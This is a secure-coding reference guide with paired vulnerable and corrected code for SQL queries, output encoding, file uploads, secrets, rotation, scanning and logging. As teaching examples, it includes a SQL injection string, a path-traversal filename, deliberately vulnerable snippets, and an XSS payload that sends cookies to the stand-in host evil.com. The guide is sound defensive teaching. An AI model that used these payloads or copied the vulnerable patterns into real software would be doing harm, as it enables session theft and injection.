# Sentinel Library: Secure Coding Patterns
> Reference knowledge for writing secure application code
> Read BEFORE handling user input, files, secrets, or external data

---

## 1. Parameterized Queries

### Why This Matters
SQL injection remains the most exploited vulnerability class. Every database query that includes
user-controlled input MUST use parameterized queries. String concatenation is never acceptable.

### PHP PDO

```php
// WRONG -- string concatenation allows SQL injection
$username = $_POST['username'];
$sql = "SELECT * FROM users WHERE username = '$username'";
// Attacker sends: ' OR '1'='1' --
// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
$result = $pdo->query($sql);

// RIGHT -- named placeholders
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username AND status = :status');
$stmt->execute([
    ':username' => $username,
    ':status'   => 'active',
]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

// RIGHT -- positional placeholders
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND status = ?');
$stmt->execute([$username, 'active']);

// RIGHT -- batch insert with prepare/execute loop
$stmt = $pdo->prepare('INSERT INTO logs (user_id, action, created_at) VALUES (?, ?, NOW())');
$pdo->beginTransaction();
foreach ($entries as $entry) {
    $stmt->execute([$entry['user_id'], $entry['action']]);
}
$pdo->commit();
```

### Node.js pg (PostgreSQL)

```js
// WRONG -- template literal injection
const email = req.body.email;
const result = await pool.query(`SELECT * FROM users WHERE email = '${email}'`);

// RIGHT -- $N positional parameters
const result = await pool.query(
    'SELECT * FROM users WHERE email = $1 AND active = $2',
    [email, true]
);

// RIGHT -- batch insert with multi-row VALUES
const values = users.map((u, i) => `($${i * 2 + 1}, $${i * 2 + 2})`).join(', ');
const params = users.flatMap(u => [u.name, u.email]);
await pool.query(
    `INSERT INTO users (name, email) VALUES ${values}`,
    params
);
```

### Node.js mysql2

```js
// WRONG -- concatenation
const id = req.params.id;
const [rows] = await connection.query(`SELECT * FROM orders WHERE id = ${id}`);

// RIGHT -- ? placeholders
const [rows] = await connection.execute(
    'SELECT * FROM orders WHERE id = ? AND user_id = ?',
    [id, userId]
);

// RIGHT -- batch insert
const values = orders.map(o => [o.product_id, o.quantity, o.price]);
await connection.query(
    'INSERT INTO order_items (product_id, quantity, price) VALUES ?',
    [values]
);
```

### Python psycopg2

```python
# WRONG -- f-string injection
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")

# WRONG -- % formatting injection
cursor.execute("SELECT * FROM users WHERE name = '%s'" % name)

# RIGHT -- %s placeholders (psycopg2 handles escaping)
cursor.execute(
    "SELECT * FROM users WHERE name = %s AND role = %s",
    (name, role)
)

# RIGHT -- named placeholders
cursor.execute(
    "SELECT * FROM users WHERE name = %(name)s AND role = %(role)s",
    {"name": name, "role": role}
)

# RIGHT -- batch insert with executemany
cursor.executemany(
    "INSERT INTO events (type, payload) VALUES (%s, %s)",
    [(e["type"], e["payload"]) for e in events]
)
```

### Python SQLAlchemy

```python
from sqlalchemy import text

# WRONG -- raw string formatting
engine.execute(f"SELECT * FROM users WHERE id = {user_id}")

# RIGHT -- text() with bound parameters
result = session.execute(
    text("SELECT * FROM users WHERE id = :id AND active = :active"),
    {"id": user_id, "active": True}
)

# RIGHT -- ORM query (inherently parameterized)
user = session.query(User).filter(User.id == user_id).first()
```

---

## 2. Output Encoding

### HTML Entity Encoding

```php
// WRONG -- raw output enables XSS
echo "<p>Welcome, " . $_GET['name'] . "</p>";
// Attacker sends: <script>document.location='https://evil.com/steal?c='+document.cookie</script>

// RIGHT -- htmlspecialchars with ENT_QUOTES and UTF-8
echo "<p>Welcome, " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . "</p>";
```

```python
# Jinja2 auto-escapes by default in Flask/Django templates
# {{ user_input }}  -- auto-escaped
# {{ user_input|safe }}  -- DANGEROUS: bypasses escaping, use only for trusted HTML

from markupsafe import escape
safe_output = escape(user_input)  # Manual escaping outside templates
```

### JavaScript Context Encoding

```php
// WRONG -- raw insertion into script tag allows script injection
echo "<script>var config = {name: '" . $userName . "'};</script>";

// RIGHT -- JSON encode for safe embedding in script context
echo "<script>var config = " . json_encode(['name' => $userName], JSON_HEX_TAG | JSON_HEX_AMP) . ";</script>";
// JSON_HEX_TAG encodes < and > preventing </script> breakout
```

```js
// WRONG -- inserting user data directly into inline script
const html = `<script>var data = "${userInput}";</script>`;

// RIGHT -- use JSON.stringify which escapes special characters
const html = `<script>var data = ${JSON.stringify(userInput)};</script>`;
// Even better: use data attributes and read from DOM
const html = `<div id="app" data-config='${JSON.stringify(config).replace(/'/g, "&#39;")}'></div>`;
```

### URL Encoding

```php
// WRONG -- unencoded parameter allows header injection
$url = "https://example.com/search?q=" . $query;

// RIGHT -- urlencode for query parameters
$url = "https://example.com/search?q=" . urlencode($query);
```

```js
// WRONG
const url = `/search?q=${query}&page=${page}`;

// RIGHT -- encodeURIComponent for individual parameters
const url = `/search?q=${encodeURIComponent(query)}&page=${encodeURIComponent(page)}`;

// RIGHT -- URLSearchParams handles encoding automatically
const params = new URLSearchParams({ q: query, page: String(page) });
const url = `/search?${params.toString()}`;
```

### Template Engine Auto-Escaping

```
Blade (Laravel):  {{ $var }}  -- auto-escaped.  {!! $var !!}  -- raw, DANGEROUS
Twig (Symfony):   {{ var }}   -- auto-escaped.  {{ var|raw }} -- raw, DANGEROUS
Jinja2 (Flask):   {{ var }}   -- auto-escaped if configured.  {{ var|safe }} -- raw
React JSX:        {value}     -- auto-escaped.  dangerouslySetInnerHTML -- raw, DANGEROUS
```

When using raw output, the content MUST come from a trusted source (database HTML field sanitized
at write time) and NEVER from direct user input. Sanitize with a library like DOMPurify (JS) or
HTMLPurifier (PHP) before storing.

---

## 3. File Upload Validation

### MIME Type Validation

```php
// WRONG -- trusting the Content-Type header from the client
$mime = $_FILES['upload']['type'];  // Client-controlled, trivially spoofed

// RIGHT -- server-side MIME detection with finfo
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['upload']['tmp_name']);

$allowedMimes = ['image/jpeg', 'image/png', 'image/webp'];
if (!in_array($mime, $allowedMimes, true)) {
    throw new InvalidArgumentException('File type not allowed');
}
```

```python
# RIGHT -- python-magic for server-side detection
import magic

mime = magic.from_file(uploaded_file.temporary_file_path(), mime=True)
allowed = {'image/jpeg', 'image/png', 'image/webp'}
if mime not in allowed:
    raise ValidationError('File type not allowed')
```

### Extension Allowlisting

```php
// WRONG -- blocklisting is incomplete; attackers find unlisted extensions
$blocked = ['php', 'exe', 'sh'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);
if (in_array($ext, $blocked)) { /* reject */ }
// Misses: .phtml, .php5, .phar, .bat, .cmd, .svg (XSS vector)

// RIGHT -- allowlist only permitted extensions
$allowed = ['jpg', 'jpeg', 'png', 'webp', 'pdf'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed, true)) {
    throw new InvalidArgumentException('Extension not allowed');
}
```

### Filename Sanitization

```php
// WRONG -- using the original filename allows path traversal
$path = '/uploads/' . $_FILES['file']['name'];
// Attacker sends filename: ../../../etc/passwd

// RIGHT -- generate a safe filename, discard the original
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$safeName = bin2hex(random_bytes(16)) . '.' . $ext;
$path = '/var/uploads/' . $safeName;  // Store OUTSIDE web root
```

### Node.js with Multer

```js
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

const storage = multer.diskStorage({
    destination: '/var/uploads/',  // Outside web root
    filename: (req, file, cb) => {
        // Generate random name, preserve only allowlisted extension
        const ext = path.extname(file.originalname).toLowerCase();
        const allowed = ['.jpg', '.jpeg', '.png', '.webp', '.pdf'];
        if (!allowed.includes(ext)) {
            return cb(new Error('Extension not allowed'));
        }
        const name = crypto.randomBytes(16).toString('hex') + ext;
        cb(null, name);
    },
});

const upload = multer({
    storage,
    limits: { fileSize: 5 * 1024 * 1024 },  // 5 MB limit
    fileFilter: (req, file, cb) => {
        const allowedMimes = ['image/jpeg', 'image/png', 'image/webp', 'application/pdf'];
        if (!allowedMimes.includes(file.mimetype)) {
            return cb(new Error('MIME type not allowed'));
        }
        cb(null, true);
    },
});
```

### Image Reprocessing

```php
// RIGHT -- reprocess images to strip EXIF metadata and embedded payloads
$image = imagecreatefromjpeg($tmpPath);
if ($image === false) {
    throw new InvalidArgumentException('Invalid image data');
}
// Re-encode to a clean file -- strips all metadata and embedded code
imagejpeg($image, $safePath, 85);
imagedestroy($image);
```

### Django File Upload

```python
# settings.py
FILE_UPLOAD_MAX_MEMORY_SIZE = 5 * 1024 * 1024  # 5 MB
MEDIA_ROOT = '/var/uploads/'  # Outside web root

# validators.py
from django.core.validators import FileExtensionValidator

class DocumentForm(forms.Form):
    file = forms.FileField(
        validators=[FileExtensionValidator(allowed_extensions=['pdf', 'jpg', 'png'])],
    )

    def clean_file(self):
        f = self.cleaned_data['file']
        if f.size > 5 * 1024 * 1024:
            raise forms.ValidationError('File exceeds 5 MB limit')
        # Verify MIME with python-magic
        import magic
        mime = magic.from_buffer(f.read(2048), mime=True)
        f.seek(0)
        if mime not in {'application/pdf', 'image/jpeg', 'image/png'}:
            raise forms.ValidationError('Invalid file type')
        return f
```

---

## 4. API Key Management

### Environment Variable Patterns

```bash
# .env (NEVER committed to version control)
STRIPE_SECRET_KEY=sk_live_abc123
DATABASE_URL=postgres://user:pass@host:5432/db
SENDGRID_API_KEY=SG.xxxx

# .env.example (committed -- placeholder values only)
STRIPE_SECRET_KEY=sk_live_your_key_here
DATABASE_URL=postgres://user:password@localhost:5432/dbname
SENDGRID_API_KEY=SG.your_key_here
```

```js
// RIGHT -- load from environment, fail fast if missing
const stripeKey = process.env.STRIPE_SECRET_KEY;
if (!stripeKey) {
    throw new Error('STRIPE_SECRET_KEY is required');
}
```

### Key Hierarchy

```
Master Key (root access, stored in vault only)
  |
  +-- Admin Key (full API access, used by backend services)
  |     |
  |     +-- Scoped Key: read-only (used by reporting service)
  |     +-- Scoped Key: write-orders (used by order service)
  |
  +-- Client Key (public, limited to safe endpoints only)
        |
        +-- Rate-limited, no access to sensitive data
```

Principle: each service gets the minimum permissions it needs. Never share a single key across
services with different access requirements.

### Client-Side vs Server-Side Keys

```
SERVER-SIDE ONLY (never expose to browser/client):
  - Database credentials
  - Payment processor secret keys (Stripe sk_live_*)
  - SMTP credentials
  - JWT signing secrets
  - Internal API keys

CLIENT-SIDE SAFE (designed for public exposure):
  - Stripe publishable key (pk_live_*)
  - Google Maps API key (restricted by HTTP referrer)
  - Firebase config (secured by Firestore rules)
  - reCAPTCHA site key
```

### Never Log API Keys

```python
# WRONG -- key appears in log files
logger.info(f"Calling API with key: {api_key}")

# WRONG -- full key in error context
logger.error(f"Auth failed for key {api_key}")

# RIGHT -- mask all but last 4 characters
def mask_key(key: str) -> str:
    if len(key) <= 4:
        return '****'
    return '*' * (len(key) - 4) + key[-4:]

logger.info(f"Calling API with key: {mask_key(api_key)}")
# Output: Calling API with key: ****************************c123
```

### API Key vs OAuth Token vs JWT Comparison

```
| Property           | API Key            | OAuth Token        | JWT                 |
|--------------------|--------------------|--------------------|---------------------|
| Identifies         | Application        | User + Application | User + Claims       |
| Expiration         | Manual rotation    | Short-lived + refresh | Configurable TTL  |
| Revocation         | Delete from DB     | Revoke at auth server | Blocklist or wait |
| Scope              | Static per key     | Dynamic per grant  | Embedded in token   |
| Stateless          | No (DB lookup)     | No (introspection) | Yes (self-contained)|
| Best for           | Server-to-server   | User delegation    | Microservices auth  |
```

---

## 5. Secret Rotation

### Database Credential Rotation

```
ZERO-DOWNTIME PATTERN:

1. Generate new credentials (user_v2 / pass_v2)
2. Grant new credentials the same permissions as old
3. Deploy application update that reads BOTH old and new credentials
4. Application tries new credentials first, falls back to old
5. Monitor: confirm all connections use new credentials
6. Revoke old credentials
7. Remove fallback logic from application
```

### JWT Signing Key Rotation with Grace Period

```js
// Maintain an array of valid signing keys with IDs
const signingKeys = {
    'kid-2026-06': { key: process.env.JWT_KEY_CURRENT, active: true },
    'kid-2026-05': { key: process.env.JWT_KEY_PREVIOUS, active: false },
};

// SIGN: always use the current active key, embed key ID in header
function signToken(payload) {
    const kid = Object.entries(signingKeys).find(([, v]) => v.active)[0];
    return jwt.sign(payload, signingKeys[kid].key, {
        algorithm: 'HS256',
        expiresIn: '1h',
        keyid: kid,
    });
}

// VERIFY: accept tokens signed with any known key (grace period)
function verifyToken(token) {
    const decoded = jwt.decode(token, { complete: true });
    const kid = decoded?.header?.kid;
    const keyEntry = signingKeys[kid];
    if (!keyEntry) throw new Error('Unknown signing key');
    return jwt.verify(token, keyEntry.key);
}
// After grace period (e.g., max token TTL), remove old key from signingKeys
```

### Automated Rotation Script Pattern

```bash
#!/bin/bash
# rotate-db-password.sh -- called by cron or CI/CD
set -euo pipefail

NEW_PASS=$(openssl rand -base64 32)

# Step 1: Update password in database
mysql -u admin -p"$ADMIN_PASS" -e "ALTER USER 'app_user'@'%' IDENTIFIED BY '$NEW_PASS';"

# Step 2: Update secret in vault / environment
vault kv put secret/db password="$NEW_PASS"

# Step 3: Trigger rolling restart of application pods
kubectl rollout restart deployment/app

echo "Password rotated at $(date -u +%Y-%m-%dT%H:%M:%SZ)"
```

---

## 6. Dependency Scanning

### npm / yarn

```bash
# Audit installed packages for known vulnerabilities
npm audit

# Fix automatically where possible (non-breaking updates)
npm audit fix

# Show only high and critical severity
npm audit --audit-level=high

# yarn equivalent
yarn audit
```

### Composer (PHP)

```bash
# Built-in audit (Composer 2.4+)
composer audit

# Show detailed advisories
composer audit --format=json
```

### pip-audit / safety (Python)

```bash
# pip-audit checks against the Python Packaging Advisory Database
pip-audit

# safety checks against the Safety DB
safety check --full-report

# Pin versions in requirements.txt to avoid supply chain drift
pip freeze > requirements.txt
```

### GitHub Dependabot Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"

  - package-ecosystem: "composer"
    directory: "/"
    schedule:
      interval: "weekly"

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Lock File Importance

Lock files (package-lock.json, composer.lock, poetry.lock) pin exact dependency versions
including transitive dependencies. ALWAYS commit lock files. Without them, a compromised
transitive dependency can be silently pulled in during install.

### CVSS Severity Interpretation

```
| CVSS Score | Severity | Action Required                          |
|------------|----------|------------------------------------------|
| 0.0        | None     | Informational only                       |
| 0.1 - 3.9  | Low      | Fix when convenient                      |
| 4.0 - 6.9  | Medium   | Fix within 30 days                       |
| 7.0 - 8.9  | High     | Fix within 7 days                        |
| 9.0 - 10.0 | Critical | Fix immediately, consider hotfix deploy  |
```

---

## 7. SAST/DAST Basics

### Static Analysis with Semgrep

```bash
# Install and run with community rules
pip install semgrep
semgrep --config=auto .

# Run specific rulesets
semgrep --config=p/owasp-top-ten .
semgrep --config=p/security-audit .
```

```yaml
# Custom semgrep rule: detect raw SQL in Python
# .semgrep/no-raw-sql.yml
rules:
  - id: no-raw-sql-format
    patterns:
      - pattern: |
          cursor.execute(f"...")
    message: "SQL query uses f-string formatting. Use parameterized queries instead."
    languages: [python]
    severity: ERROR

  - id: no-raw-sql-concat
    patterns:
      - pattern: |
          cursor.execute("..." + $VAR)
    message: "SQL query uses string concatenation. Use parameterized queries."
    languages: [python]
    severity: ERROR
```

### Dynamic Analysis with OWASP ZAP

```bash
# Run ZAP in headless mode against staging environment
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
    -t https://staging.example.com \
    -r report.html

# Full scan (slower, more thorough)
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
    -t https://staging.example.com \
    -r full-report.html
```

### CI/CD Integration

```yaml
# GitHub Actions example
name: Security Scan
on: [push, pull_request]

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Semgrep SAST
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/security-audit
            .semgrep/

  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm audit --audit-level=high
```

### False Positive Management

```yaml
# Inline suppression with justification (semgrep)
# nosemgrep: no-raw-sql-format  -- This query uses only compile-time constants, not user input
cursor.execute(f"SELECT COUNT(*) FROM {TABLE_NAME}")  # TABLE_NAME is a code constant

# File-level exclusions in .semgrepignore
tests/
vendor/
node_modules/
*.test.js
```

Document every suppression with a comment explaining WHY it is safe. Suppressions without
justification should be rejected in code review.

---

## 8. Secure Error Handling

### Never Expose Stack Traces

```php
// WRONG -- stack trace visible to attacker, reveals file paths and library versions
ini_set('display_errors', '1');
// Output: Fatal error: Uncaught PDOException in /var/www/app/src/UserRepository.php:42

// RIGHT -- log internally, show generic message to user
ini_set('display_errors', '0');
ini_set('log_errors', '1');
ini_set('error_log', '/var/log/php/error.log');

set_exception_handler(function (Throwable $e) {
    error_log($e->getMessage() . "\n" . $e->getTraceAsString());
    http_response_code(500);
    echo json_encode(['error' => 'An internal error occurred. Please try again later.']);
    exit;
});
```

### Express Error Middleware (Node.js)

```js
// WRONG -- leaking error details to the client
app.use((err, req, res, next) => {
    res.status(500).json({ error: err.message, stack: err.stack });
});

// RIGHT -- structured error handling
class AppError extends Error {
    constructor(message, statusCode, isOperational = true) {
        super(message);
        this.statusCode = statusCode;
        this.isOperational = isOperational;  // true = expected error, safe to show message
    }
}

app.use((err, req, res, next) => {
    // Log full error internally
    logger.error({
        message: err.message,
        stack: err.stack,
        url: req.originalUrl,
        method: req.method,
        ip: req.ip,
    });

    // Return safe response
    if (err instanceof AppError && err.isOperational) {
        return res.status(err.statusCode).json({ error: err.message });
    }

    // Unknown errors get a generic message
    res.status(500).json({ error: 'Internal server error' });
});

// Usage in routes
app.get('/users/:id', async (req, res, next) => {
    try {
        const user = await findUser(req.params.id);
        if (!user) throw new AppError('User not found', 404);
        res.json(user);
    } catch (err) {
        next(err);
    }
});
```

### Django Exception Handling

```python
# settings.py -- NEVER True in production
DEBUG = False

# Custom exception handler for DRF
from rest_framework.views import exception_handler
import logging

logger = logging.getLogger(__name__)

def custom_exception_handler(exc, context):
    response = exception_handler(exc, context)

    if response is None:
        # Unhandled exception -- log and return generic 500
        logger.exception("Unhandled exception", exc_info=exc)
        return Response(
            {"error": "An internal error occurred"},
            status=500,
        )

    return response
```

### Structured API Error Responses

```json
// Consistent error format across all endpoints
{
    "error": {
        "code": "VALIDATION_FAILED",
        "message": "The request contains invalid parameters",
        "details": [
            {"field": "email", "issue": "Must be a valid email address"},
            {"field": "age", "issue": "Must be a positive integer"}
        ]
    }
}

// For 500 errors -- NEVER include stack traces or internal paths
{
    "error": {
        "code": "INTERNAL_ERROR",
        "message": "An unexpected error occurred. Please try again later.",
        "request_id": "req_abc123"
    }
}
// The request_id lets support staff correlate with internal logs
```

---

## 9. Logging Without Sensitive Data

### What to ALWAYS Log

```
- Authentication events (login success, login failure, logout)
- Authorization failures (access denied)
- Account changes (password change, email change, role change)
- Administrative actions (user created, user deleted, config changed)
- Input validation failures (potential attack probing)
- Application errors with request context
- Rate limit triggers
- File upload events
```

### What to NEVER Log

```
- Passwords (even hashed -- no reason to log them)
- Full credit card numbers
- Social Security Numbers / national IDs
- API keys, tokens, secrets
- Session IDs (use a derived identifier instead)
- Personal health information
- Raw authentication headers
- Full request bodies containing sensitive forms
```

### PII Redaction Patterns

```js
// Redact email: show first 2 chars and domain
function redactEmail(email) {
    const [local, domain] = email.split('@');
    if (!domain) return '***@***';
    return local.slice(0, 2) + '***@' + domain;
}
// "john.doe@example.com" -> "jo***@example.com"

// Mask credit card: show last 4 digits only
function maskCard(number) {
    const digits = number.replace(/\D/g, '');
    if (digits.length < 4) return '****';
    return '**** **** **** ' + digits.slice(-4);
}
// "4111111111111111" -> "**** **** **** 1111"

// Strip password fields from objects before logging
function sanitizeForLog(obj) {
    const sanitized = { ...obj };
    const sensitiveFields = ['password', 'token', 'secret', 'apiKey', 'authorization',
                             'creditCard', 'ssn', 'cardNumber', 'cvv'];
    for (const key of Object.keys(sanitized)) {
        if (sensitiveFields.includes(key.toLowerCase())) {
            sanitized[key] = '[REDACTED]';
        }
    }
    return sanitized;
}
```

### Structured Logging (JSON Format)

```js
// RIGHT -- structured JSON logs for machine parsing
const logger = require('pino')({
    level: process.env.LOG_LEVEL || 'info',
    redact: {
        paths: ['req.headers.authorization', 'req.body.password', 'req.body.token'],
        censor: '[REDACTED]',
    },
});

logger.info({
    event: 'user.login',
    userId: user.id,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    success: true,
});

// Output:
// {"level":"info","time":1719849600000,"event":"user.login","userId":42,"ip":"1.2.3.4","success":true}
```

```python
import logging
import json

class SanitizingFormatter(logging.Formatter):
    SENSITIVE_KEYS = {'password', 'token', 'secret', 'api_key', 'authorization', 'ssn'}

    def format(self, record):
        if hasattr(record, 'data') and isinstance(record.data, dict):
            record.data = {
                k: '[REDACTED]' if k.lower() in self.SENSITIVE_KEYS else v
                for k, v in record.data.items()
            }
        return super().format(record)
```

### Log Levels and When to Use Each

```
| Level   | When to Use                                              |
|---------|----------------------------------------------------------|
| DEBUG   | Detailed diagnostic info. NEVER in production.           |
| INFO    | Normal operations: startup, shutdown, request served.    |
| WARN    | Recoverable issues: deprecated API used, retry needed.   |
| ERROR   | Operation failed but application continues.              |
| FATAL   | Application cannot continue, about to exit.              |
```

```php
// PHP: PSR-3 logger with structured context
$logger->info('Order placed', [
    'order_id' => $order->id,
    'user_id'  => $order->user_id,
    'total'    => $order->total,
    // Do NOT log: payment card details, billing address with full name
]);

$logger->error('Payment failed', [
    'order_id'   => $order->id,
    'error_code' => $exception->getCode(),
    'message'    => $exception->getMessage(),
    // Do NOT log: $exception->getTraceAsString() unless internal-only log sink
]);

$logger->warning('Rate limit approaching', [
    'user_id'      => $userId,
    'requests'     => $count,
    'limit'        => $maxRequests,
    'window'       => '60s',
]);
```

---

## Quick Reference: Secure Defaults Checklist

```
[ ] All SQL queries use parameterized statements
[ ] All output is encoded for its context (HTML, JS, URL, CSS)
[ ] File uploads validate MIME type server-side, use allowlisted extensions
[ ] Uploaded files are stored outside the web root with random names
[ ] API keys and secrets live in environment variables, never in code
[ ] Secrets are rotated on a schedule with zero-downtime patterns
[ ] Dependencies are scanned weekly with npm audit / composer audit / pip-audit
[ ] SAST runs in CI on every pull request
[ ] Error responses never include stack traces or internal paths
[ ] Logs redact passwords, tokens, credit cards, and PII
[ ] Lock files are committed to version control
[ ] Production runs with DEBUG=false and display_errors=off
```
